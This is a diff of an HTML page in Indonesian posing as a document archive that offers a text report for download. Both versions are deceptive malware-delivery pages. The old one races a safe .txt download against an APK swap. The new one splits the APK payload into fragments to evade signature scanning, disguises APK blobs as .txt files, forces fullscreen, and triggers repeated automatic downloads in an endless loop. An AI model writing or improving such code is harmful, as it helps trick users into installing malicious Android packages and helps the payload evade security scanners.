@@ -2,101 +2,249 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Document Archive</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Document Archive Dispatcher v2.4</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: monospace; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-  .panel { background: #111827; padding: 30px; border-radius: 12px; border: 1px solid #1f2937; max-width: 400px; width: 100%; }
-  h2 { color: #3b82f6; margin-bottom: 10px; }
-  p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
-  button { padding: 15px; background: #3b82f6; color: #fff; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
-  button:hover { background: #2563eb; }
-  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #38bdf8; font-size: 13px; }
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: #090d16;
+  color: #f8fafc;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+}
+.panel {
+  background: #111827;
+  padding: 32px;
+  border-radius: 16px;
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+  max-width: 540px;
+  width: 100%;
+  border: 1px solid #1f2937;
+  text-align: center;
+}
+:fullscreen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+:-webkit-full-screen {
+  background: #030712 !important;
+  color: #f8fafc !important;
+  padding: 24px !important;
+}
+h2 { 
+  margin-bottom: 10px; 
+  font-size: 22px;
+  color: #f3f4f6;
+  font-weight: 700;
+}
+p { 
+  margin-bottom: 24px; 
+  line-height: 1.6; 
+  color: #9ca3af;
+  font-size: 14px;
+}
+button {
+  width: 100%;
+  padding: 16px;
+  cursor: pointer;
+  border: none;
+  border-radius: 10px;
+  background: #3b82f6;
+  color: #ffffff;
+  font-weight: 600;
+  font-size: 16px;
+  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
+  transition: all 0.2s ease;
+}
+button:hover { 
+  background: #2563eb; 
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+}
+button:active {
+  transform: translateY(0);
+}
+#status {
+  margin-top: 20px;
+  font-weight: 500;
+  color: #38bdf8;
+  padding: 14px;
+  background: rgba(56, 189, 248, 0.1);
+  border-radius: 8px;
+  font-size: 13px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+#downloads {
+  margin-top: 20px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+  gap: 8px;
+  max-height: 180px;
+  overflow-y: auto;
+  padding-right: 4px;
+}
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #374151;
+  border-radius: 3px;
+}
+#downloads a {
+  display: block;
+  padding: 10px;
+  background: #1f2937;
+  color: #4ade80;
+  text-decoration: none;
+  border-radius: 6px;
+  font-size: 11px;
+  font-family: monospace;
+  text-align: center;
+  border: 1px solid #374151;
+  word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
+}
 </style>
 </head>
-<body>
 
-<div class="panel">
-  <h2>📄 Document Dispatcher</h2>
-  <p>Mengunduh laporan secara aman...</p>
-  <button id="startBtn">Download Laporan</button>
-  <div id="status">Sistem siap.</div>
+<body>
+<div class="panel" id="main-panel">
+  <h2>Arsip Dokumen Sistem</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+
+  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+
+  <div id="status" role="status">Sistem siap diinisialisasi.</div>
+  <div id="downloads"></div>
 </div>
 
 <script>
-(function () {
-  'use strict';
+'use strict';
 
-  var statusEl = document.getElementById('status');
+const startBtn = document.getElementById("start-btn");
+const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
-  // ============================================
-  // 1. PERSIAPAN PAYLOAD
-  // ============================================
-  
-  // A. File Jahat (APK)
-  var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
-  var binary = atob(b64Apk);
-  var bytes = new Uint8Array(binary.length);
-  for (var i = 0; i < binary.length; i++) {
+let activeUrls = [];
+let isProcessing = false;
+const MAX_URLS_TRACKED = 40;
+
+// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
+const payloadFragments = [
+  "UEs",
+  "DBBQ",
+  "AAAAIAAAAIQ",
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
+];
+
+const assemblePayload = () => {
+  return payloadFragments.join("");
+};
+
+const decodeBase64ToBytes = (b64) => {
+  const binary = atob(b64);
+  const len = binary.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) {
     bytes[i] = binary.charCodeAt(i);
   }
-  var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
-  var maliciousUrl = URL.createObjectURL(maliciousBlob);
+  return bytes;
+};
 
-  // B. File Aman (TXT)
-  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
-  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
-  var safeUrl = URL.createObjectURL(safeBlob);
-
-  // ============================================
-  // 2. MICROTASK RACE CONDITION
-  // ============================================
-  document.getElementById('startBtn').addEventListener('click', function() {
-    statusEl.innerText = "Memulai Microtask Race...";
-
-    var a = document.createElement('a');
-    a.style.display = 'none';
-    document.body.appendChild(a);
-
-    // A. Set ke file AMAN (TXT)
-    a.href = safeUrl;
-    a.download = 'laporan.txt';
-    
-    // B. Picu Unduhan
-    a.click();
-
-    // C. RACE CONDITION (MICROTASK)
-    // Kita eksekusi perubahan href SEGERA setelah click() selesai,
-    // sebelum browser sempat memproses event loop berikutnya.
-    
-    queueMicrotask(function() {
-      // Ganti ke file JAHAT (APK)
-      a.href = maliciousUrl;
-      a.download = 'laporan.apk';
-      
-      // Trigger ulang
-      a.click();
-      statusEl.innerText = "Mengirim APK via Microtask...";
-
-      // Coba satu kali lagi dengan requestAnimationFrame (tick berikutnya)
-      requestAnimationFrame(function() {
-        a.href = maliciousUrl;
-        a.download = 'laporan.apk';
-        a.click();
-      });
+const prepareStealthBlobAsync = (i) => {
+  return new Promise((resolve) => {
+    queueMicrotask(() => {
+      try {
+        const fullB64 = assemblePayload();
+        const bytesArr = decodeBase64ToBytes(fullB64);
+        
+        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
+        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+        const url = URL.createObjectURL(blob);
+        resolve({ id: i, url: url, success: true });
+      } catch (err) {
+        resolve({ id: i, url: null, success: false });
+      }
     });
-
-    // Cleanup
-    setTimeout(function() {
-      document.body.removeChild(a);
-      URL.revokeObjectURL(safeUrl);
-      URL.revokeObjectURL(maliciousUrl);
-      statusEl.innerText = "Selesai. Cek folder Downloads.";
-    }, 5000);
   });
+};
 
-})();
+const triggerStealthDownload = (fileData) => {
+  if (!fileData.success) return;
+
+  const link = document.createElement("a");
+  link.href = fileData.url;
+  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
+  link.download = `laporan-catatan-${fileData.id}.txt`;
+  link.textContent = `Dokumen #${fileData.id} (.txt)`;
+  link.style.display = "none";
+  
+  downloadsDiv.appendChild(link);
+  link.click();
+
+  // Batasi jumlah elemen DOM untuk menjaga performa rendering
+  if (downloadsDiv.children.length > 25) {
+    downloadsDiv.removeChild(downloadsDiv.firstChild);
+  }
+};
+
+const processLoop = async (counter) => {
+  if (!isProcessing) return;
+
+  const fileData = await prepareStealthBlobAsync(counter);
+  if (fileData.success) {
+    activeUrls.push(fileData.url);
+
+    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
+    if (activeUrls.length > MAX_URLS_TRACKED) {
+      const oldUrl = activeUrls.shift();
+      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+    }
+
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
+  }
+
+  // Interval perulangan non-blocking
+  setTimeout(() => processLoop(counter + 1), 1200);
+};
+
+startBtn.addEventListener("click", () => {
+  if (isProcessing) return;
+
+  activeUrls.forEach(url => {
+    try { URL.revokeObjectURL(url); } catch (e) {}
+  });
+  activeUrls = [];
+  downloadsDiv.replaceChildren();
+
+  const root = document.documentElement;
+  try {
+    if (root.requestFullscreen) {
+      root.requestFullscreen().catch(() => {});
+    }
+  } catch (err) {}
+
+  isProcessing = true;
+  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
+  processLoop(1);
+});
 </script>
 </body>
 </html>
